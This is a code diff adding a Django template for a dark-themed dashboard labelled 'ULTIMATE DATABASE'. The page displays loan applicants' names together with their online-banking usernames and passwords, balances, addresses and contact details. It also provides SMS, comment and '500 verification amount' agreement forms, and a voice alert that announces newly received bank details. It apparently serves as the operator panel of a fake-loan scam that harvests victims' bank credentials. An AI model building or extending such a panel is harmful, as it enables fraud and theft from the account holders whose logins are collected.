@@ -1,0 +1,295 @@
+{% include 'darkdashboard/header.html' %}
+<head> <script src="https://code.jquery.com/jquery-3.5.1.js" integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script> </head>
+{% load static %}
+        <!--  BEGIN CONTENT PART  -->
+        <div id="content" class="main-content">
+            
+<tbody>
+
+              
+
+
+          <div style="color: white; text-align: left; margin: 20px">     {% for info in recentmsg %}
+                                            <tr>
+                                                 <td id="thisisphone">{{info.phone_number |slice:"2:"}}
+
+
+                                                 </td>
+                                                <td id="">{{info.text_sms}}</td>
+
+
+                                            </tr>
+                                            {% endfor %}
+                                            </tbody> </div>
+                 
+                </div>
+
+                <div  class="row layout-top-spacing
+">
+
+
+
+                   <div id="tableDark" class="col-lg-12 col-12 layout-spacing">
+                            <div class="statbox widget box box-shadow">
+                                <div class="widget-header">
+                                    <div class="row">
+                                        <div class="col-xl-12 col-md-12 col-sm-12 col-12">
+                                            <h4 id="headline" style="text-align: center;">ULTIMATE DATABASE</h4>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="widget-content widget-content-area">
+                                    <div class="table-responsive">
+                                        <table class="table table-hover table-dark mb-4" id="example34">
+                                            <thead style="background: blue;">
+                                              <tr>
+                                                <th> ID </th>
+                                                <th> check </th>
+
+                                                <th>SMS</th>
+
+                                                <th>Full Name</th>
+
+                                            <th>Loan</th>
+                                            <th>Comments</th>
+                                            <th>Username</th>
+                                            <th>Password</th>
+                                            <th>Online</th>
+                                            <th>Phone</th>
+                                            <th>Banking</th>
+
+
+                                            <th>ReturnTime</th>
+                                            <th>Due Date</th>
+                                            <th>Email</th>
+                                            <th>Balance</th>
+                                            <th>Address</th>
+                                            <th>City</th>
+                                            <th>State</th>
+                                            <th>Zip</th>
+
+
+                                            </tr>
+                                        </thead>
+
+
+
+                                        <tbody style="background: blue;" >
+                                            {% for info in full_bank_details %}
+                                            <tr>
+
+                                                <td> <button id="{{info.id}}" onClick="reply_click(this.id)"> {{info.id}} {{info.star}} </td></button>
+
+
+
+
+
+    <td style="padding-top: 40px;">
+ 
+
+<form action="/agreementpayday" method="post">
+  {% csrf_token %}
+
+<input type = "hidden" name = "database" value = "{{info.id}}" />
+<input type = "hidden" name = "VERIFICATION AMOUNT" value = "500" />
+<input type = "hidden" name = "PAYMENT DATE" value = "{{info.payment_date}}" />
+
+
+
+<input type = "hidden" name = "LOAN AMOUNT" value = "{{info.loan_amount}}" />
+
+
+
+
+
+<input type = "hidden" name = "full_name" value = "{{info.first_name}} {{info.last_name}}" />
+
+   <button style="margin-top: 20px;" type="submit" id="test" class="btn btn-primary btn-sm">Agreement</button>
+ </form>
+
+
+
+
+
+
+
+
+
+
+<td>
+
+
+
+</td>
+
+
+
+
+
+                        {{live_chat_link}}
+           <form action="sendmsg2" method="get">
+  {% csrf_token %}
+  <input type = "hidden" name = "phone" value = "{{info.phone}}" />
+                                   <td style="padding-top: 40px;">
+ <div class="form-group mb-4">
+
+    <input type="text" name="message"  id="inputText1" placeholder="Message *" style="width: 100px;">
+{{info.first_name}} {{info.last_name}}
+
+
+</select> </td> </form>
+
+
+
+
+
+
+
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;" id="nameidhere">{{info.loan_amount}} <br> <span style="color:#00FF00;">{{info.bank_name}}</span>
+
+<form action="deposit-now-receive-today">
+  {% csrf_token %}
+  <input type = "hidden" name = "closed_by" value = "{{info.id}}" />
+  <input type = "hidden" name = "database" value = "{{info.id}}" />
+</form>
+                                                </td>
+                                                 <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;">
+
+
+
+                                                    {{info.loan_amount}} 
+
+
+Last 4 Digit - {{info.phone|slice:"6:"}}
+
+
+
+
+
+
+
+                                                 </td>
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;">{{info.comment}} <br> 
+<form action="addcomment" method="post">
+  {% csrf_token %}
+  <input type = "hidden" name = "database" id="database" value = "{{info.id}}" />
+  <input style="margin-top: 10px; width: 100px;" type="text" name="comment" id="comment" placeholder="Comment *">
+</form>
+
+                                                </td>
+                                                <td style="font-family:Helvetica; color:#00FF00 ; font-size: 18px;">{{info.username}}</td>
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FF00;font-size: 18px;">{{info.password}}</td>
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;" >{{info.online_banking_status}}</td>
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif; color:#00FFFF;">{{info.phone}}</td>
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;">{{info.since_how_long_banking}}</td>
+
+
+
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;">{{info.money_return_time}}</td>
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;">{{info.payment_date}}</td>
+
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;">{{info.email}}</td>
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;">{{info.current_balance_in_account}}</td>
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;">{{info.address}}</td>
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;">{{info.city}}</td>
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;">{{info.state}}</td>
+                                                <td style="font-family:Trebuchet MS, Geneva, Tahoma, sans-serif;color:#00FFFF;">{{info.zip_code}}</td>
+                                                {% endfor %}
+
+
+                                            </tr>
+                                            </tbody>
+                                        </table>
+                                    </div>
+
+
+<script>
+var check_code_running = 1;
+
+  document.getElementById('checkamounts').addEventListener('change', function (e) {
+  if (e.target.value === "manual") {
+    var intervalId = window.setInterval(function(){
+    document.getElementById("form4").submit();
+    document.getElementById("form5").submit();
+    check_code_running++;
+    if(check_code_running===4){
+         clearInterval(intervalId);
+
+    }
+
+}, 10000);
+
+
+  }
+});
+
+
+var time = new Date().getTime();
+$(document.body).bind("mousemove keypress", function(e) {
+ time = new Date().getTime();
+});
+
+function refresh() {
+
+
+
+ if(new Date().getTime() - time >= 15000)
+     window.location.reload(true);
+ else
+     setTimeout(refresh, 15000);
+
+
+
+
+}
+
+
+setTimeout(refresh, 15000);
+
+</script>
+
+
+
+<script>
+
+console.log('Hello There!')
+var oldValue = localStorage.getItem('name')
+console.log(oldValue)
+var newValue = document.querySelector("#example34 > tbody > tr:nth-child(1) > td:nth-child(12)").innerText
+console.log(newValue)
+
+localStorage.setItem('name', newValue)
+if (oldValue === newValue) {
+    console.log("No new information here")
+    
+
+
+}
+else {
+    console.log("Received")
+    var synth = window.speechSynthesis;
+    name = document.querySelector("#nameidhere").innerText
+
+    bank_name = document.querySelector("#example34 > tbody > tr:nth-child(1) > td:nth-child(14)").innerText
+
+    var utterance = new SpeechSynthesisUtterance('DETAILS RECEIVED BY' + name + 'BANK NAME' + bank_name );
+    utterance.volume = 1.0
+    synth.speak(utterance);
+
+}
+
+
+
+
+
+
+</script>
+
+
+
+
+
+
+
+
+ {% include 'darkdashboard/footer.html' %}
